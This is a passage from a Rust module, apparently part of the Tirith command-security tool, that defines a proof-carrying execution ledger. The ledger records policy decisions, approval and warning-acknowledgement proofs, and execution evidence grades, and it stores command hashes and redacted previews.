//! Proof-carrying execution state for session correlation.
//!
//! This module deliberately separates a policy decision prepared before launch
//! from evidence observed at a real execution boundary. Raw command text is
//! retained only in memory; durable records carry its SHA-256 digest and a
//! redacted, bounded preview.

use std::fmt;
use std::fs::File;
#[cfg(unix)]
use std::fs::{self, OpenOptions};
#[cfg(unix)]
use std::io::{Read as _, Seek as _, SeekFrom, Write as _};
#[cfg(unix)]
use std::path::Path;
use std::path::PathBuf;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

#[cfg(unix)]
use fs2::FileExt as _;
use serde::{Deserialize, Serialize};
use sha2::{Digest as _, Sha256};

use crate::agent_origin::AgentOrigin;
use crate::escalation::CallerContext;
use crate::event_buffer::EventPrototype;
use crate::policy::Policy;
use crate::tokenize::ShellType;
use crate::verdict::{Action, Verdict};

mod shell_receipt;
pub use shell_receipt::{
    arm_shell_execution_receipt, consume_shell_execution_receipt, create_shell_execution_receipt,
    discard_shell_execution_receipt, reconcile_shell_execution_receipt,
    register_shell_hook_instance, register_shell_hook_instance_with_delivery,
    shell_execution_receipt_context, validate_shell_hook_instance, ShellApprovalOutcome,
    ShellHookFamily, ShellReceiptChannel, ShellReceiptContext,
};

pub const EXECUTION_LEDGER_SCHEMA_VERSION: u32 = 2;
pub const MAX_CONFIRMED_EXECUTIONS: usize = 200;
pub const MAX_UNRESOLVED_EXECUTIONS: usize = 200;
const MAX_WARNING_EVENTS_PER_EXECUTION: usize = 128;
const MAX_ESCALATION_EVENTS_PER_EXECUTION: usize = 64;
pub const DEFAULT_DRAFT_TTL: Duration = Duration::from_secs(30);
pub const DEFAULT_GATE_LOCK_TIMEOUT: Duration = Duration::from_secs(5);
const LOCK_RETRY_INTERVAL: Duration = Duration::from_millis(5);
const STRICT_STATE_MAGIC: &[u8; 8] = b"TIRXST02";
const STRICT_STATE_HEADER_LEN: u64 = 8 + 8 + 32;
const STRICT_STATE_SLOT_SIZE: u64 = 4 * 1024 * 1024;
const STRICT_STATE_FILE_SIZE: u64 = STRICT_STATE_SLOT_SIZE * 2;
const STRICT_STATE_PAYLOAD_CAP: usize = (STRICT_STATE_SLOT_SIZE - STRICT_STATE_HEADER_LEN) as usize;
const STRICT_ANCHOR_PREFIX: &str = "TIRITH-EXECUTION-ANCHOR-V1 ";
const STRICT_ANCHOR_CAP: u64 = 256;

/// Quality of the evidence presented when an execution transition is promoted.
///
/// Only a kernel exec-stop or an exact, uniquely matched gateway completion is
/// confirmed. Shell boundary observations stay explicitly unresolved and are
/// stored in a separate ledger; they may tighten later correlation decisions,
/// but can never be represented as executed history.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
enum ExecutionEvidenceGrade {
    KernelExecStop,
    KernelExecStoppedUnresolved,
    GatewayCompleted,
    GatewayForwardedUnresolved,
    #[serde(alias = "shell_preexec_unresolved")]
    ShellBoundaryUnresolved,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
struct EvidenceTransition {
    evidence_id: String,
    grade: ExecutionEvidenceGrade,
    observed_unix_ms: u64,
    ledger_sequence: u64,
    generation: u64,
}

impl ExecutionEvidenceGrade {
    pub fn is_confirmed(self) -> bool {
        matches!(self, Self::KernelExecStop | Self::GatewayCompleted)
    }
}

/// Evidence bound to one immutable execution draft.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ExecutionEvidence {
    execution_id: String,
    evidence_id: String,
    grade: ExecutionEvidenceGrade,
}

impl ExecutionEvidence {
    fn new(
        execution_id: impl Into<String>,
        evidence_id: impl Into<String>,
        grade: ExecutionEvidenceGrade,
    ) -> Result<Self, String> {
        let execution_id = execution_id.into();
        let evidence_id = evidence_id.into();
        validate_stable_id("execution", &execution_id)?;
        validate_stable_id("evidence", &evidence_id)?;
        Ok(Self {
            execution_id,
            evidence_id,
            grade,
        })
    }

    pub fn execution_id(&self) -> &str {
        &self.execution_id
    }

    pub fn evidence_id(&self) -> &str {
        &self.evidence_id
    }

    fn grade(&self) -> ExecutionEvidenceGrade {
        self.grade
    }

    #[cfg_attr(not(target_os = "linux"), allow(dead_code))]
    pub(crate) fn kernel_exec_stop(
        execution_id: impl Into<String>,
        evidence_id: impl Into<String>,
    ) -> Result<Self, String> {
        Self::new(
            execution_id,
            evidence_id,
            ExecutionEvidenceGrade::KernelExecStop,
        )
    }

    #[cfg_attr(not(target_os = "linux"), allow(dead_code))]
    pub(crate) fn kernel_exec_stopped_unresolved(
        execution_id: impl Into<String>,
        evidence_id: impl Into<String>,
    ) -> Result<Self, String> {
        Self::new(
            execution_id,
            evidence_id,
            ExecutionEvidenceGrade::KernelExecStoppedUnresolved,
        )
    }

    pub(crate) fn gateway_completed(
        execution_id: impl Into<String>,
        evidence_id: impl Into<String>,
    ) -> Result<Self, String> {
        Self::new(
            execution_id,
            evidence_id,
            ExecutionEvidenceGrade::GatewayCompleted,
        )
    }

    pub(crate) fn shell_boundary_unresolved(
        execution_id: impl Into<String>,
        evidence_id: impl Into<String>,
    ) -> Result<Self, String> {
        Self::new(
            execution_id,
            evidence_id,
            ExecutionEvidenceGrade::ShellBoundaryUnresolved,
        )
    }

    pub(crate) fn gateway_forwarded_unresolved(
        execution_id: impl Into<String>,
        evidence_id: impl Into<String>,
    ) -> Result<Self, String> {
        Self::new(
            execution_id,
            evidence_id,
            ExecutionEvidenceGrade::GatewayForwardedUnresolved,
        )
    }
}

/// Frozen basis for the launch decision. Fields are private so callers cannot
/// construct an internally inconsistent allow decision.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PreparedDecision {
    action: Action,
    requires_approval: bool,
    requires_warn_ack: bool,
    policy_basis_sha256: String,
    verdict_basis_sha256: String,
}

/// Timestamp-free warning data frozen into an execution draft. Only redacted,
/// bounded presentation fields are materialized into the strict ledger.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
struct WarningPrototype {
    rule_id: String,
    severity: String,
    title: String,
    domains: Vec<String>,
}

impl PreparedDecision {
    pub(crate) fn from_frozen_basis(verdict: &Verdict, policy: &Policy) -> Result<Self, String> {
        let verdict_basis = serde_json::to_vec(verdict)
            .map_err(|error| format!("serialize frozen verdict basis: {error}"))?;
        Ok(Self {
            action: verdict.action,
            requires_approval: verdict.requires_approval == Some(true),
            requires_warn_ack: verdict.action == Action::WarnAck
                || (verdict.action == Action::Warn && policy.strict_warn),
            // Bind the exact decision/correlation policy. Only this digest is
            // durable; rule values, labels, paths, and credentials remain in
            // memory and cannot collapse to the same count/key projection.
            policy_basis_sha256: policy.execution_identity_hash()?,
            verdict_basis_sha256: sha256_hex(&verdict_basis),
        })
    }

    pub fn action(&self) -> Action {
        self.action
    }

    pub fn requires_approval(&self) -> bool {
        self.requires_approval
    }

    pub fn requires_warn_ack(&self) -> bool {
        self.requires_warn_ack
    }

    pub fn policy_basis_sha256(&self) -> &str {
        &self.policy_basis_sha256
    }

    pub fn verdict_basis_sha256(&self) -> &str {
        &self.verdict_basis_sha256
    }
}

/// Frozen bypass facts. Keeping the tuple together prevents a later caller from
/// silently reinterpreting whether a prepared decision used a bypass.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct BypassSnapshot {
    requested: bool,
    available: bool,
    honored: bool,
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum ApprovalResolution {
    NotRequired,
    Pending,
    Granted { proof_sha256: String },
    FallbackAllow { proof_sha256: String },
    FallbackWarn { proof_sha256: String },
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum WarnAckResolution {
    NotRequired,
    Pending,
    Acknowledged { proof_sha256: String },
}

/// Approval and warning acknowledgement are independent requirements. Keeping
/// them in separate slots prevents a proof for one interaction from silently
/// satisfying a decision that froze both requirements.
#[derive(Debug, Clone, PartialEq, Eq)]
struct InteractionResolution {
    approval: ApprovalResolution,
    warn_ack: WarnAckResolution,
}

#[derive(Debug)]
enum VerifiedApprovalResolution {
    Granted(String),
    FallbackAllow(String),
    FallbackWarn(String),
}

#[derive(Debug)]
struct VerifiedInteractions {
    approval: Option<VerifiedApprovalResolution>,
    warn_ack_proof_sha256: Option<String>,
}

impl InteractionResolution {
    fn for_decision(decision: &PreparedDecision) -> Self {
        Self {
            approval: if decision.requires_approval {
                ApprovalResolution::Pending
            } else {
                ApprovalResolution::NotRequired
            },
            warn_ack: if decision.requires_warn_ack {
                WarnAckResolution::Pending
            } else {
                WarnAckResolution::NotRequired
            },
        }
    }

    fn permits_execution(&self) -> bool {
        matches!(
            &self.approval,
            ApprovalResolution::NotRequired
                | ApprovalResolution::Granted { .. }
                | ApprovalResolution::FallbackAllow { .. }
                | ApprovalResolution::FallbackWarn { .. }
        ) && matches!(
            &self.warn_ack,
            WarnAckResolution::NotRequired | WarnAckResolution::Acknowledged { .. }
        )
    }

    fn approval_tag(&self) -> &'static str {
        match &self.approval {
            ApprovalResolution::NotRequired => "not_required",
            ApprovalResolution::Pending => "pending",
            ApprovalResolution::Granted { .. } => "granted",
            ApprovalResolution::FallbackAllow { .. } => "fallback_allow",
            ApprovalResolution::FallbackWarn { .. } => "fallback_warn",
        }
    }

    fn warn_ack_tag(&self) -> &'static str {
        match &self.warn_ack {
            WarnAckResolution::NotRequired => "not_required",
            WarnAckResolution::Pending => "pending",
            WarnAckResolution::Acknowledged { .. } => "acknowledged",
        }
    }

    fn approval_proof_sha256(&self) -> Option<&str> {
        match &self.approval {
            ApprovalResolution::Granted { proof_sha256 }
            | ApprovalResolution::FallbackAllow { proof_sha256 }
            | ApprovalResolution::FallbackWarn { proof_sha256 } => Some(proof_sha256),
            ApprovalResolution::NotRequired | ApprovalResolution::Pending => None,
        }
    }

    fn warn_ack_proof_sha256(&self) -> Option<&str> {
        match &self.warn_ack {
            WarnAckResolution::Acknowledged { proof_sha256 } => Some(proof_sha256),
            WarnAckResolution::NotRequired | WarnAckResolution::Pending => None,
        }
    }
}

impl BypassSnapshot {
    fn from_verdict(verdict: &Verdict) -> Result<Self, String> {
        if verdict.bypass_honored && (!verdict.bypass_requested || !verdict.bypass_available) {
            return Err("honored bypass lacks requested and available evidence".to_string());
        }
        Ok(Self {
            requested: verdict.bypass_requested,
            available: verdict.bypass_available,
            honored: verdict.bypass_honored,
        })
    }

    pub fn requested(self) -> bool {
        self.requested
    }

    pub fn available(self) -> bool {
        self.available
    }

    pub fn honored(self) -> bool {
        self.honored
    }
}

/// Durable, privacy-bounded evidence for one prepared execution. The raw
/// command, policy object, origin details, and unredacted findings never enter
/// this record.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ExecutionLedgerRecord {
    execution_id: String,
    draft_identity_sha256: String,
    command_sha256: String,
    command_redacted_preview: String,
    policy_basis_sha256: String,
    verdict_basis_sha256: String,
    evidence_id: String,
    evidence_grade: ExecutionEvidenceGrade,
    evidence_history: Vec<EvidenceTransition>,
    committed_unix_ms: u64,
    retention_until_unix_ms: u64,
    ledger_sequence: u64,
    generation: u64,
    #[serde(default)]
    warning_events: Vec<crate::session_warnings::WarningEvent>,
    #[serde(default)]
    escalation_events: Vec<crate::session_warnings::EscalationEvent>,
    events: Vec<crate::event_buffer::TypedEvent>,
}

impl ExecutionLedgerRecord {
    pub fn execution_id(&self) -> &str {
        &self.execution_id
    }

    pub fn command_sha256(&self) -> &str {
        &self.command_sha256
    }

    pub fn is_confirmed(&self) -> bool {
        self.evidence_grade.is_confirmed()
    }

    pub fn events(&self) -> &[crate::event_buffer::TypedEvent] {
        &self.events
    }

    fn identity_matches(&self, draft: &ExecutionDraft) -> bool {
        self.execution_id == draft.execution_id
            && self.draft_identity_sha256 == draft.draft_identity_sha256
    }

    fn exact_evidence_matches(&self, evidence: &ExecutionEvidence) -> bool {
        self.evidence_id == evidence.evidence_id && self.evidence_grade == evidence.grade
    }
}

/// Versioned proof-carrying portion of a session record. Confirmed executions
/// feed normal correlation history. Unresolved observations remain separate and
/// may tighten a later decision conservatively, but are never represented as
/// executed history.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ExecutionLedger {
    #[serde(default = "execution_ledger_schema_version")]
    pub schema_version: u32,
    pub session_id: String,
    /// Random identity bound into the stable session lock file. If the strict
    /// file disappears while that anchor remains, Tirith refuses to recreate it
    /// from mutable presentation JSON.
    pub instance_id: String,
    /// SHA-256 of the exact legacy JSON bytes imported at initialization.
    /// `None` means the legacy file was absent and the strict history began
    /// empty. The mutable JSON is never consulted again.
    legacy_source_sha256: Option<String>,
    legacy_imported_unix_ms: u64,
    #[serde(default)]
    pub generation: u64,
    #[serde(default = "first_ledger_sequence")]
    pub next_sequence: u64,
    #[serde(default = "first_ledger_sequence")]
    pub next_event_sequence: u64,
    /// One-time strict snapshot of legacy security history. Once this file is
    /// initialized, mutable best-effort presentation JSON is never consulted by
    /// authorization again.
    #[serde(default)]
    legacy_warning_events: std::collections::VecDeque<crate::session_warnings::WarningEvent>,
    #[serde(default)]
    legacy_typed_events: std::collections::VecDeque<crate::event_buffer::TypedEvent>,
    #[serde(default)]
    pub confirmed: std::collections::VecDeque<ExecutionLedgerRecord>,
    #[serde(default)]
    pub unresolved: std::collections::VecDeque<ExecutionLedgerRecord>,
}

impl ExecutionLedger {
    fn new(
        session_id: &str,
        legacy: Option<&crate::session_warnings::SessionWarnings>,
        legacy_source_sha256: Option<String>,
    ) -> Result<Self, String> {
        let mut legacy_warning_events = legacy
            .map(|session| session.events.clone())
            .unwrap_or_default();
        for event in &mut legacy_warning_events {
            event.domains = event
                .domains
                .iter()
                .map(|domain| domain.to_lowercase())
                .collect();
            event.domains.sort();
            event.domains.dedup();
        }
        let mut legacy_typed_events = legacy
            .map(|session| session.typed_events.clone())
            .unwrap_or_default();
        for event in &mut legacy_typed_events {
            // The legacy best-effort recorder had no execution proof. Keep its
            // observations only as conservative unresolved history.
            event.provenance = crate::event_buffer::EventProvenance::Unresolved;
        }
        Ok(Self {
            schema_version: EXECUTION_LEDGER_SCHEMA_VERSION,
            session_id: session_id.to_string(),
            instance_id: format!("ledger-{}", uuid::Uuid::new_v4().simple()),
            legacy_source_sha256,
            legacy_imported_unix_ms: unix_time_ms()?,
            generation: 0,
            next_sequence: 1,
            next_event_sequence: legacy
                .map(|session| session.next_typed_event_sequence.max(1))
                .unwrap_or(1),
            legacy_warning_events,
            legacy_typed_events,
            confirmed: std::collections::VecDeque::new(),
            unresolved: std::collections::VecDeque::new(),
        })
    }
}

fn execution_ledger_schema_version() -> u32 {
    EXECUTION_LEDGER_SCHEMA_VERSION
}

fn first_ledger_sequence() -> u64 {
    1
}

fn derive_warning_prototypes(verdict: &Verdict) -> Result<Vec<WarningPrototype>, String> {
    let should_record =
        matches!(verdict.action, Action::Warn | Action::WarnAck) || verdict.bypass_honored;
    if !should_record {
        return Ok(Vec::new());
    }
    let mut prototypes = Vec::new();
    for finding in verdict
        .findings
        .iter()
        .filter(|finding| finding.severity >= crate::verdict::Severity::Low)
    {
        let mut domains = crate::session_warnings::extract_domains_from_evidence(&finding.evidence)
            .into_iter()
            .map(|domain| domain.to_lowercase())
            .collect::<Vec<_>>();
        domains.sort();
        domains.dedup();
        if domains.len() > 32 || domains.iter().any(|domain| domain.len() > 255) {
            return Err("execution warning contains too many or oversized domains".to_string());
        }
        prototypes.push(WarningPrototype {
            rule_id: finding.rule_id.to_string(),
            severity: finding.severity.to_string(),
            title: crate::util::truncate_bytes(&finding.title, 120),
            domains,
        });
    }
    if prototypes.len() > MAX_WARNING_EVENTS_PER_EXECUTION {
        return Err("execution decision contains too many strict warning events".to_string());
    }
    Ok(prototypes)
}

fn policy_history_retention_ms(policy: &Policy) -> u64 {
    const MINIMUM_RETENTION_MS: u64 = 2 * 60 * 1000;
    policy
        .escalation
        .iter()
        .fold(MINIMUM_RETENTION_MS, |retention, rule| match rule {
            crate::escalation::EscalationRule::RepeatCount {
                window_minutes,
                cooldown_minutes,
                ..
            } => retention.max(window_minutes.max(cooldown_minutes).saturating_mul(60_000)),
            crate::escalation::EscalationRule::MultiMedium { .. } => retention,
        })
}

/// Immutable, in-memory launch draft. Raw command bytes never leave this value.
pub struct ExecutionDraft {
    execution_id: String,
    draft_identity_sha256: String,
    session_id: String,
    command_sha256: String,
    command_redacted_preview: String,
    command: String,
    created_unix_ms: u64,
    expires_unix_ms: u64,
    expected_generation: u64,
    caller: CallerContext,
    shell: ShellType,
    origin: Option<AgentOrigin>,
    bypass: BypassSnapshot,
    decision: PreparedDecision,
    interaction: InteractionResolution,
    /// Raw engine verdict retained only in memory so the gate can independently
    /// replay every policy/session transformation under the stable lock.
    raw_verdict: Verdict,
    /// Exact effective verdict used for preparation. It is required for an
    /// identity comparison after that independent recheck and is never
    /// serialized or rendered.
    effective_verdict: Verdict,
    /// Exact policy object used for preparation. This intentionally remains
    /// in-memory and is never included in Debug or durable ledger records.
    correlation_policy: Policy,
    provisional_events: Vec<EventPrototype>,
    warning_prototypes: Vec<WarningPrototype>,
    escalation_hits: Vec<crate::escalation::EscalationHit>,
    retention_until_unix_ms: u64,
}

impl fmt::Debug for ExecutionDraft {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter
            .debug_struct("ExecutionDraft")
            .field("execution_id", &self.execution_id)
            .field("session_id", &self.session_id)
            .field("command_sha256", &self.command_sha256)
            .field("created_unix_ms", &self.created_unix_ms)
            .field("expires_unix_ms", &self.expires_unix_ms)
            .field("expected_generation", &self.expected_generation)
            .field("caller", &self.caller)
            .field("shell", &self.shell)
            .field("bypass", &self.bypass)
            .field("decision", &self.decision)
            .field("provisional_event_count", &self.provisional_events.len())
            .finish_non_exhaustive()
    }
}

impl ExecutionDraft {
    // Keep each frozen security input explicit at this constructor boundary. A
    // grouped options object would obscure provenance and make accidental
    // reuse across executions easier during future changes.
    #[allow(clippy::too_many_arguments)]
    pub(crate) fn new(
        session_id: &str,
        command: &str,
        command_redacted_preview: String,
        expected_generation: u64,
        raw_verdict: &Verdict,
        effective_verdict: &Verdict,
        policy: &Policy,
        caller: CallerContext,
        shell: ShellType,
        provisional_events: Vec<EventPrototype>,
        escalation_hits: Vec<crate::escalation::EscalationHit>,
        ttl: Duration,
    ) -> Result<Self, String> {
        if crate::session_warnings::session_state_path(session_id).is_none() {
            return Err("execution draft has an invalid session id".to_string());
        }
        let now = unix_time_ms()?;
        let ttl_ms = u64::try_from(ttl.as_millis())
            .map_err(|_| "execution draft TTL is outside the supported range".to_string())?;
        let expires_unix_ms = now
            .checked_add(ttl_ms)
            .ok_or_else(|| "execution draft expiry overflowed".to_string())?;
        let decision = PreparedDecision::from_frozen_basis(effective_verdict, policy)?;
        let bypass = BypassSnapshot::from_verdict(effective_verdict)?;
        let interaction = InteractionResolution::for_decision(&decision);
        if escalation_hits.len() > MAX_ESCALATION_EVENTS_PER_EXECUTION {
            return Err(
                "execution decision contains too many strict escalation events".to_string(),
            );
        }
        let warning_prototypes = derive_warning_prototypes(effective_verdict)?;
        let retention_until_unix_ms = now.saturating_add(policy_history_retention_ms(policy));
        let mut draft = Self {
            execution_id: uuid::Uuid::new_v4().simple().to_string(),
            draft_identity_sha256: String::new(),
            session_id: session_id.to_string(),
            command_sha256: sha256_hex(command.as_bytes()),
            command_redacted_preview: crate::util::truncate_bytes(&command_redacted_preview, 120),
            command: command.to_string(),
            created_unix_ms: now,
            expires_unix_ms,
            expected_generation,
            caller,
            shell,
            origin: effective_verdict.agent_origin.clone(),
            bypass,
            decision,
            interaction,
            raw_verdict: raw_verdict.clone(),
            effective_verdict: effective_verdict.clone(),
            correlation_policy: policy.clone(),
            provisional_events,
            warning_prototypes,
            escalation_hits,
            retention_until_unix_ms,
        };
        draft.draft_identity_sha256 = compute_draft_identity(&draft)?;
        Ok(draft)
    }

    pub fn execution_id(&self) -> &str {
        &self.execution_id
    }

    pub fn session_id(&self) -> &str {
        &self.session_id
    }

    pub fn command_sha256(&self) -> &str {
        &self.command_sha256
    }

    pub fn draft_identity_sha256(&self) -> &str {
        &self.draft_identity_sha256
    }

    pub fn redacted_preview(&self) -> &str {
        &self.command_redacted_preview
    }

    pub fn created_unix_ms(&self) -> u64 {
        self.created_unix_ms
    }

    pub fn expires_unix_ms(&self) -> u64 {
        self.expires_unix_ms
    }

    pub fn expected_generation(&self) -> u64 {
        self.expected_generation
    }

    pub fn decision(&self) -> &PreparedDecision {
        &self.decision
    }

    pub fn interaction_is_resolved(&self) -> bool {
        self.interaction.permits_execution()
    }

    pub fn caller(&self) -> CallerContext {
        self.caller
    }

    pub fn shell(&self) -> ShellType {
        self.shell
    }

    pub fn origin(&self) -> Option<&AgentOrigin> {
        self.origin.as_ref()
    }

    pub fn bypass(&self) -> BypassSnapshot {
        self.bypass
    }

    pub(crate) fn command(&self) -> &str {
        &self.command
    }

    pub(crate) fn correlation_policy(&self) -> &Policy {
        &self.correlation_policy
    }

    pub(crate) fn effective_verdict(&self) -> &Verdict {
        &self.effective_verdict
    }

    pub(crate) fn raw_verdict(&self) -> &Verdict {
        &self.raw_verdict
    }

    pub(crate) fn provisional_events(&self) -> &[EventPrototype] {
        &self.provisional_events
    }

    fn resolve_verified_interactions(
        &mut self,
        verified: VerifiedInteractions,
    ) -> Result<(), String> {
        self.interaction.approval = match (self.decision.requires_approval(), verified.approval) {
            (false, None) => ApprovalResolution::NotRequired,
            (false, Some(_)) => {
                return Err(
                    "approval proof was supplied for a decision that did not require it"
                        .to_string(),
                )
            }
            (true, None) => return Err("required approval proof is missing".to_string()),
            (true, Some(VerifiedApprovalResolution::Granted(proof_sha256))) => {
                ApprovalResolution::Granted { proof_sha256 }
            }
            (true, Some(VerifiedApprovalResolution::FallbackAllow(proof_sha256))) => {
                if self.effective_verdict.approval_fallback.as_deref() != Some("allow") {
                    return Err(
                        "approval fallback proof does not match the frozen allow policy"
                            .to_string(),
                    );
                }
                ApprovalResolution::FallbackAllow { proof_sha256 }
            }
            (true, Some(VerifiedApprovalResolution::FallbackWarn(proof_sha256))) => {
                if self.effective_verdict.approval_fallback.as_deref() != Some("warn") {
                    return Err(
                        "approval fallback proof does not match the frozen warn policy".to_string(),
                    );
                }
                ApprovalResolution::FallbackWarn { proof_sha256 }
            }
        };
        self.interaction.warn_ack =
            match (
                self.decision.requires_warn_ack(),
                verified.warn_ack_proof_sha256,
            ) {
                (false, None) => WarnAckResolution::NotRequired,
                (false, Some(_)) => return Err(
                    "warning acknowledgement was supplied for a decision that did not require it"
                        .to_string(),
                ),
                (true, None) => {
                    return Err("required warning acknowledgement proof is missing".to_string())
                }
                (true, Some(proof_sha256)) => WarnAckResolution::Acknowledged { proof_sha256 },
            };
        self.draft_identity_sha256 = compute_draft_identity(self)?;
        Ok(())
    }

    fn replace_execution_id(&mut self, execution_id: String) -> Result<(), String> {
        validate_stable_id("execution", &execution_id)?;
        self.execution_id = execution_id;
        self.draft_identity_sha256 = compute_draft_identity(self)?;
        Ok(())
    }

    #[cfg_attr(not(target_os = "linux"), allow(dead_code))]
    pub(crate) fn kernel_exec_stop_evidence(
        &self,
        evidence_id: impl Into<String>,
    ) -> Result<ExecutionEvidence, String> {
        ExecutionEvidence::kernel_exec_stop(self.execution_id.clone(), evidence_id)
    }

    #[cfg_attr(not(target_os = "linux"), allow(dead_code))]
    pub(crate) fn kernel_exec_stopped_unresolved_evidence(
        &self,
        evidence_id: impl Into<String>,
    ) -> Result<ExecutionEvidence, String> {
        ExecutionEvidence::kernel_exec_stopped_unresolved(self.execution_id.clone(), evidence_id)
    }

    pub(crate) fn gateway_completed_evidence(
        &self,
        evidence_id: impl Into<String>,
    ) -> Result<ExecutionEvidence, String> {
        ExecutionEvidence::gateway_completed(self.execution_id.clone(), evidence_id)
    }

    pub(crate) fn shell_boundary_evidence(
        &self,
        evidence_id: impl Into<String>,
    ) -> Result<ExecutionEvidence, String> {
        ExecutionEvidence::shell_boundary_unresolved(self.execution_id.clone(), evidence_id)
    }

    pub(crate) fn gateway_forwarded_evidence(
        &self,
        evidence_id: impl Into<String>,
    ) -> Result<ExecutionEvidence, String> {
        ExecutionEvidence::gateway_forwarded_unresolved(self.execution_id.clone(), evidence_id)
    }
}

/// A security decision and its immutable execution identity prepared from one
/// strictly read session generation. The draft remains opaque: callers may
/// inspect the verdict, but only a trusted execution boundary can promote it.
pub struct PreparedExecution {
    verdict: Verdict,
    draft: ExecutionDraft,
}

impl fmt::Debug for PreparedExecution {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter
            .debug_struct("PreparedExecution")
            .field("verdict", &self.verdict)
            .field("draft", &self.draft)
            .finish()
    }
}

impl PreparedExecution {
    pub fn verdict(&self) -> &Verdict {
        &self.verdict
    }

    pub fn execution_id(&self) -> &str {
        self.draft.execution_id()
    }

    /// Whether this exact prepared decision still needs an explicit warning
    /// acknowledgement before it can become authorizable.
    pub fn requires_warn_ack(&self) -> bool {
        self.draft.decision.requires_warn_ack()
    }

    /// Recompute the trusted runner's explicit bypass against the authoritative
    /// strict-session verdict. Preview state is intentionally not accepted as
    /// an input: a session escalation can change the final action while the
    /// confirmation prompt is open. Every frozen identity affected by the
    /// bypass fact is rebuilt before the draft can leave the core.
    pub(crate) fn reapply_runner_bypass(
        mut self,
        requested: bool,
        available: bool,
    ) -> Result<(Self, bool), String> {
        let honored = requested
            && available
            && self.verdict.action == Action::Block
            && self.verdict.requires_approval != Some(true);
        for verdict in [
            &mut self.verdict,
            &mut self.draft.raw_verdict,
            &mut self.draft.effective_verdict,
        ] {
            verdict.bypass_requested = requested;
            verdict.bypass_available = available;
            verdict.bypass_honored = honored;
        }
        self.draft.bypass = BypassSnapshot {
            requested,
            available,
            honored,
        };
        self.draft.decision = PreparedDecision::from_frozen_basis(
            &self.draft.effective_verdict,
            &self.draft.correlation_policy,
        )?;
        self.draft.interaction = InteractionResolution::for_decision(&self.draft.decision);
        self.draft.warning_prototypes = derive_warning_prototypes(&self.draft.effective_verdict)?;
        self.draft.draft_identity_sha256 = compute_draft_identity(&self.draft)?;
        Ok((self, honored))
    }

    /// Bind a runner-owned confirmation to the exact warning verdict the user
    /// saw before answering. The runner deliberately cannot inject an arbitrary
    /// proof digest: this method derives it inside the core only after confirming
    /// that the displayed and freshly prepared warning sets are semantically
    /// identical. Timing-only analysis differences are excluded from that
    /// comparison.
    pub(crate) fn bind_runner_confirmation(
        mut self,
        displayed_verdict: &Verdict,
        warnings_acknowledged: bool,
    ) -> Result<Self, String> {
        let warn_ack_proof_sha256 = if self.draft.decision.requires_warn_ack() {
            if !warnings_acknowledged {
                return Err(
                    "fresh execution decision requires acknowledgement of warnings that were not displayed"
                        .to_string(),
                );
            }
            let displayed_basis = interaction_verdict_sha256(displayed_verdict)?;
            let prepared_basis = interaction_verdict_sha256(&self.verdict)?;
            if displayed_basis != prepared_basis {
                return Err(
                    "fresh execution warnings changed after confirmation; explicit acknowledgement must be repeated"
                        .to_string(),
                );
            }
            let identity = format!(
                "tirith-runner-interaction-v1\0{}\0{}\0{}\0{}\0{}\0warn_acknowledged",
                self.draft.execution_id,
                self.draft.command_sha256,
                self.draft.decision.policy_basis_sha256,
                self.draft.decision.verdict_basis_sha256,
                prepared_basis,
            );
            Some(sha256_hex(identity.as_bytes()))
        } else {
            None
        };
        self.draft
            .resolve_verified_interactions(VerifiedInteractions {
                approval: None,
                warn_ack_proof_sha256,
            })?;
        Ok(self)
    }

    pub fn into_authorizable_draft(self) -> Result<ExecutionDraft, String> {
        validate_draft(&self.draft)?;
        Ok(self.draft)
    }
}

/// Hash the user-visible security meaning of a verdict. Engine timing fields
/// naturally differ across the preview and mandatory post-confirmation replay,
/// but every field that can alter the warning presented to the user remains in
/// this identity.
fn interaction_verdict_sha256(verdict: &Verdict) -> Result<String, String> {
    let mut value = serde_json::to_value(verdict)
        .map_err(|error| format!("serialize runner interaction verdict: {error}"))?;
    let object = value
        .as_object_mut()
        .ok_or_else(|| "serialized runner interaction verdict is not an object".to_string())?;
    object.remove("timings_ms");
    Ok(sha256_hex(
        crate::audit::canonical_json_for_hash(&value).as_bytes(),
    ))
}

/// Prepare a proof-carrying execution decision from a strict, single-generation
/// session snapshot. This path never resets corrupt state and never records the
/// provisional command as executed.
// These arguments are the complete trust-boundary inputs. Keeping them
// explicit makes every caller supply the policy, shell, identity, and timing
// basis independently instead of hiding security-relevant defaults in a bag.
#[allow(clippy::too_many_arguments)]
pub fn prepare_execution(
    raw_verdict: &Verdict,
    policy: &Policy,
    command: &str,
    session_id: &str,
    caller: CallerContext,
    shell: ShellType,
    ttl: Duration,
    lock_timeout: Duration,
) -> Result<PreparedExecution, String> {
    #[cfg(not(unix))]
    {
        let _ = (
            raw_verdict,
            policy,
            command,
            session_id,
            caller,
            shell,
            ttl,
            lock_timeout,
        );
        return Err(
            "strict execution-state preparation is not supported on this platform".to_string(),
        );
    }

    #[cfg(unix)]
    {
        let deadline = Instant::now()
            .checked_add(lock_timeout)
            .ok_or_else(|| "execution preparation deadline overflowed".to_string())?;
        let state_path = crate::session_warnings::session_state_path(session_id)
            .ok_or_else(|| "execution preparation has an invalid session id".to_string())?;
        let lock_path = crate::session_warnings::session_lock_path(session_id)
            .ok_or_else(|| "execution preparation has no stable lock path".to_string())?;
        let parent = state_path
            .parent()
            .ok_or_else(|| "execution session path has no parent".to_string())?;
        ensure_secure_session_directory(parent)?;
        let lock_file =
            open_and_lock_secure(&lock_path, deadline).map_err(|error| error.to_string())?;
        let lock_identity = secure_regular_identity(&lock_file, "execution lock")?;
        let strict_candidate = strict_state_path(parent, session_id);
        let strict_missing = match fs::symlink_metadata(&strict_candidate) {
            Ok(_) => false,
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => true,
            Err(error) => return Err(format!("inspect strict execution state: {error}")),
        };
